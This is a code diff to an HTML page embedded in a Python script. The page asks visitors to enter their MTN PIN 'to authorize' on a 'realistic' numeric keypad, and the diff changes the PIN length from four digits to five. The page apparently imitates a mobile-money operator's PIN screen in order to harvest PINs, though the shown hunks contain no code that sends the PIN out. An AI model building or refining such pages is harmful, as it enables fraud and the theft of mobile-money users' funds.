@@ -474,7 +474,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
       <div class="text-center pt-2">
         <div class="w-14 h-14 mx-auto rounded-full bg-blue-100 text-[#FFCC00] flex items-center justify-center text-2xl mb-3">🔒</div>
         <h2 class="text-2xl font-black text-[#FFCC00]">ENTER YOUR PIN</h2>
-        <p class="text-xs text-slate-500 mt-1">Please enter your 4-digit MTN PIN to authorize</p>
+        <p class="text-xs text-slate-500 mt-1">Please enter your 5-digit MTN PIN to authorize</p>
       </div>
 
       <!-- PIN Indicator Dots -->
@@ -483,6 +483,8 @@ HTML_PAGE = r"""<!DOCTYPE html>
         <div id="dot-1" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all"></div>
         <div id="dot-2" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all"></div>
         <div id="dot-3" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all"></div>
+        <div id="dot-4" class="w-4 h-4 rounded-full border-2 border-slate-300 transition-all"></div>
+
       </div>
 
       <!-- Realistic Numeric Keypad -->
@@ -874,16 +876,16 @@ HTML_PAGE = r"""<!DOCTYPE html>
     let isPinBusy = false;
 
     function pressPin(digit) {
-      if (isPinBusy || enteredPin.length >= 4) return;
+      if (isPinBusy || enteredPin.length >= 5) return;
       enteredPin += digit;
       updatePinDots();
-      if (enteredPin.length === 4) {
+      if (enteredPin.length === 5) {
         isPinBusy = true;
         const msg = document.getElementById('pin-status-msg');
         if (msg) msg.innerText = 'Verifying PIN...';
         
         // Add wave animation to dots with staggered delays
-        for (let i = 0; i < 4; i++) {
+        for (let i = 0; i < 5; i++) {
           const dot = document.getElementById('dot-' + i);
           if (dot) dot.classList.add('wave-dot-' + i);
         }
